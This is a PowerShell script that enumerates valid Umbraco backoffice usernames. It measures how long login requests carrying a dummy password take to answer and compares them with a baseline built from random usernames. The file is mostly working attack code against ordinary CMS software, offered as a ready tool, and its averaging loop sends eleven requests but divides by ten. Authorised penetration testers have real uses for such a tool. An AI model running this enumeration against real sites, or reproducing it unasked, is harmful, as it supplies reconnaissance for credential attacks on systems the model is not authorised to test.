<#

.SYNOPSIS
    Attempt to enumerate users that may have backoffice access to an
    Umbraco website.

.DESCRIPTION
    Users are enumerated by measuring how much time a login request takes
    to respond. When a username is invalid the response is much quicker
    than when a username is valid.

.PARAMETER SiteUrl
    Url of the Umbraco site that will be enumerated.

.PARAMETER UsersDict
    Path to a text file that contains the list of users to test.
    There should be one username per line.

.PARAMETER MarginMs
    Time margin in milliseconds to determine whether a user exists. 100Ms by default.

.EXAMPLE
    Test-UmbracoUsersEnumeration -SiteUrl "http://myumbracowebsite.com" -UsersDict "C:\temp\users_dict.txt"

.NOTES
    Author: Cristhian Amaya <cam at camaya.co>
    Version: 1.0.0

#>


[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [Uri]$SiteUrl,

    [Parameter(Mandatory = $true)]
    [ValidateScript({Test-Path -LiteralPath $_ -PathType Leaf})]
    [string]$UsersDict,

    [int]$MarginMs = 100
)

Function Measure-LoginResponseTime($Username) {
    $loginUrl = "$($SiteUrl.ToString().TrimEnd('/'))/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
    $timetaken = Measure-Command -Expression {
        try {
            Invoke-WebRequest -Uri $loginUrl `
                                -Method POST `
                                -ContentType "application/json" `
                                -Body "{'username': '$Username', 'password': '1234567890'}"
        }
        catch {}
    }
    $timetaken.TotalMilliseconds
}

Function Get-InvalidUserAvgResponseTime {
    $reqCount = 10
    $totalTime = 0
    $username = New-Guid
    foreach($i in 0..$reqCount) {
        $totalTime += Measure-LoginResponseTime -Username $username
    }
    $avgTime = $totalTime / $reqCount
    $avgTime
}

$invalidAvgTime = Get-InvalidUserAvgResponseTime
Write-Verbose "The average response time for an invalid user is $invalidAvgTime"

$existingUsers = New-Object System.Collections.ArrayList

[System.IO.File]::ReadLines($usersDict) | ForEach-Object {
    Write-Verbose "Testing user $_"
    $responseTime = Measure-LoginResponseTime -Username $_
    Write-Verbose "Time taken for user $($_): $responseTime"
    $timeDiff = $responseTime - $invalidAvgTime
    if ($timeDiff -gt $MarginMs) {
        Write-Verbose "The user $_ exists"
        $existingUsers.Add($_) | Out-Null
    }
    else {
        Write-Verbose "The user $_ does not exists"
    }
}

if ($existingUsers.Count -gt 0) {
    Write-Output "Users found:`n"
    Write-Output $existingUsers
} else {
    Write-Output "None of the users in the dictionary were found."
}
